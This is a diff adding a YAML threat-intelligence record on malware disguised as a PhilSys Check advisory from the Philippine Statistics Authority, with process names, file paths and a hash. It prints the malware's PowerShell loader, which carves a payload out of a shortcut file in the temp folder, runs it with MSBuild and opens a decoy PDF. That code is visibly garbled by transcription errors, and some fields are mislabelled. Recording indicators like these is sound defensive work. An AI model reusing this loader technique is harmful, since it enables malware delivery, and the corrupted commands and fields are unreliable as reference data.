@@ -1,0 +1,43 @@
+description: The Philippine Statistics Authority (PSA) issued a public advisory regarding
+  updated verification results of the PhilSys v (PhilSys Check), effective 01 December
+  2023.
+TTPs:
+  processes:
+  - powershellexe
+  - MSBuild.exe
+  - AcroRd32.exe
+  commandline:
+  - 'powershell.exe $i=$env:tmp;$e=\\\"Advisory23-UCDMS04-11-0pdfInk\\\";$h=\"gci $i
+    -r -ea O|?($_.Name -like $e -and $_.Length -eq 1898912}|sort LastWriteTime -desc;if($h
+    Count -gt O){$e=$h[0].FullName};$q=[System IO File];$n=$q:ReadALIBytes($e):$y=$i+\\\"\\ChromeConnection\\\";$a:
+    WriteAllBytes($y,$n2772.9721);c:\\w*\\ *t\\*4\\v4*\\ *d *e "$y";$y=$i+\\\"\\ Advisory23-UCDMS04-T1-01pdf\\\";$a:
+    WriteAllBytes($y,$n[97211.1898912]);if(test-path $y){&Sy;}'
+  - MSBuild.exe %TEMP%\\ChromeConnection
+  powershell:
+  - '$i=$env:tmp;$e=\\\"Advisory23-UCDMS04-11-0pdfInk\\\";$h=\"gci $i -r -ea O|?($_.Name
+    -like $e -and $_.Length -eq 1898912}|sort LastWriteTime -desc;if($h Count -gt
+    O){$e=$h[0].FullName};$q=[System IO File];$n=$q:ReadALIBytes($e):$y=$i+\\\"\\ChromeConnection\\\";$a:
+    WriteAllBytes($y,$n2772.9721);c:\\w*\\ *t\\*4\\v4*\\ *d *e "$y";$y=$i+\\\"\\ Advisory23-UCDMS04-T1-01pdf\\\";$a:
+    WriteAllBytes($y,$n[97211.1898912]);if(test-path $y){&Sy;}'
+  scripting_engine:
+  - powershell
+  registry_keys: null
+  image_load: null
+  network_connections:
+  - AcroRd32.exe %TEMP%\\Advisory23-UCDMS04-11-01.pdf
+  file_activity:
+  - '%TEMP%\\ChromeConnection'
+  - '%TEMP%\\Advisory23-UCDMS04-T1-01pdf'
+  - C:\\Users\\ssOXkCi\\AppData\\Local\\Temp +\\\"\\ChromeCo.nnection\\\"
+  persistence: null
+  pipes: null
+  process_relations: null
+IOCs:
+  hashes:
+  - cac4d4364d20fa343bf681f6544b31995a57d8f69ee606c4675db60be5ae8775
+  IPs: null
+  domains: null
+  URLs: null
+reference: https://hybrid-analysis.blogspot.com/2024/
+date_of_publication: August 21, 2025
+file_creation_date: August 21, 2025
